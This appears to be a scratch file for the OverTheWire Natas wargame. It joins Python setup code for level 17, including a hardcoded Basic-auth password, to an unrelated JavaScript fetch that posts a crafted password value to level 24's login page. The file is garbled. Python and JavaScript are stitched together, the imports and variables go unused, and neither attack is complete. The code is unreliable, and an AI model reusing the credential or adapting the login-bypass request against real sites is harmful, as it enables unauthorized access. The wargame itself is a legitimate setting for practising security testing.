from base64 import b64encode
from itertools import chain
from time import time

import requests

idx = 0
pw = ''
url = 'http://natas17.natas.labs.overthewire.org/index.php?debug'
userAndPass = b64encode(b"natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}


var data1 = new FormData();
data1.append('passwd', 0x03033,);
fetch("http://natas24.natas.labs.overthewire.org/", {"credentials":"include","body": data1,"method":"POST","mode":"cors"}).then(async r => console.log(await r.text()))